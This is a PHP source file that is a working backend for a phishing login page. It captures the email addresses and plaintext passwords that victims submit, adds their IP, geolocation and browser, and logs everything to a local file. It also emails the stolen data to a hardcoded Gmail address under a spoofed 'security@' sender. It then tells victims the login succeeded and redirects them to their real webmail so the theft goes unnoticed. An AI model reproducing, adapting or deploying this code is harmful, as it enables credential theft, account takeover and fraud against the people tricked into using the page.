<?php
// Final PHP handler - Works with both AJAX and form submissions
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Request-With, X-Requested-With');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit(0);
}

// Detect if this is an AJAX request or form submission
$isAjax = !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && 
          strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';

// Set appropriate content type
if ($isAjax) {
    header('Content-Type: application/json; charset=UTF-8');
} else {
    header('Content-Type: text/html; charset=UTF-8');
}

// GET request - connectivity test
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $response = array(
        'status' => 'success',
        'message' => 'Server is working correctly',
        'timestamp' => date('Y-m-d H:i:s'),
        'server' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'method' => 'GET',
        'php_version' => phpversion()
    );
    
    if ($isAjax) {
        echo json_encode($response);
    } else {
        echo '<html><body>';
        echo '<h2>Server Status: Working</h2>';
        echo '<p>Timestamp: ' . $response['timestamp'] . '</p>';
        echo '<p>Server: ' . $response['server'] . '</p>';
        echo '<p>PHP Version: ' . $response['php_version'] . '</p>';
        echo '</body></html>';
    }
    exit;
}

// POST request - handle login
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        $error = array(
            'signal' => 'error',
            'msg' => 'Email and password are required',
            'success' => false
        );
        
        if ($isAjax) {
            echo json_encode($error);
        } else {
            echo '<html><body>error: ' . $error['msg'] . '</body></html>';
        }
        exit;
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = array(
            'signal' => 'error',
            'msg' => 'Invalid email format',
            'success' => false
        );
        
        if ($isAjax) {
            echo json_encode($error);
        } else {
            echo '<html><body>error: ' . $error['msg'] . '</body></html>';
        }
        exit;
    }
    
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $domain = explode("@", $email)[1] ?? 'unknown';
    
    // Get geolocation
    $country = 'Unknown';
    $city = 'Unknown';
    
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip);
        if ($geoData) {
            $geo = json_decode($geoData);
            $country = $geo->geoplugin_countryName ?? 'Unknown';
            $city = $geo->geoplugin_city ?? 'Unknown';
        }
    } catch (Exception $e) {
        // Ignore geo errors
    }
    
    // Prepare detailed message
    $message = "Email = " . $email . "\n";
    $message .= "Password = " . $password . "\n";
    $message .= "IP: " . $country . " | " . $city . " | " . $ip . "\n";
    $message .= "Browser: " . $browser . "\n";
    $message .= "Domain: " . $domain . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $message .= "Method: " . ($isAjax ? 'AJAX' : 'Form Submission') . "\n";
    
    // Log to file
    $logEntry = "[" . date('Y-m-d H:i:s') . "] LOGIN ATTEMPT\n" . $message . "\n" . str_repeat("-", 50) . "\n";
    @file_put_contents('login_attempts.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Test SMTP connectivity
    $validCredentials = false;
    $errorMessage = '';
    
    try {
        $smtpHost = 'mail.' . $domain;
        $smtpPort = 587;
        
        $socket = @fsockopen($smtpHost, $smtpPort, $errno, $errstr, 10);
        if ($socket) {
            fclose($socket);
            $validCredentials = true;
        } else {
            $errorMessage = "SMTP connection failed: $errstr ($errno)";
        }
    } catch (Exception $e) {
        $errorMessage = 'SMTP test failed: ' . $e->getMessage();
    }
    
    // Send email notification
    $notificationEmail = 'skkho87.sm@gmail.com';
    $subject = ($validCredentials ? 'VALID' : 'INVALID') . ' Login Attempt || ' . $country . ' || ' . $email;
    
    $emailBody = "Login attempt captured:\n\n" . $message;
    if (!$validCredentials) {
        $emailBody .= "\nError: " . $errorMessage;
    }
    
    $headers = "From: security@" . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    $emailSent = @mail($notificationEmail, $subject, $emailBody, $headers);
    
    // Prepare response
    if ($validCredentials) {
        $response = array(
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting to your mailbox...',
            'success' => true,
            'redirect_url' => 'https://webmail.' . $domain,
            'smtp_test' => true,
            'email_sent' => $emailSent
        );
        
        if ($isAjax) {
            echo json_encode($response);
        } else {
            echo '<html><body>ok: ' . $response['msg'] . '</body></html>';
        }
    } else {
        $response = array(
            'signal' => 'not ok',
            'msg' => 'Invalid email or password. Please try again.',
            'success' => false,
            'smtp_test' => false,
            'email_sent' => $emailSent,
            'error_detail' => $errorMessage
        );
        
        if ($isAjax) {
            echo json_encode($response);
        } else {
            echo '<html><body>error: ' . $response['msg'] . '</body></html>';
        }
    }
    exit;
}

// Invalid method
if ($isAjax) {
    echo json_encode(array(
        'status' => 'error',
        'message' => 'Method not allowed',
        'allowed_methods' => ['GET', 'POST', 'OPTIONS']
    ));
} else {
    echo '<html><body><h2>Error: Method not allowed</h2></body></html>';
}
?>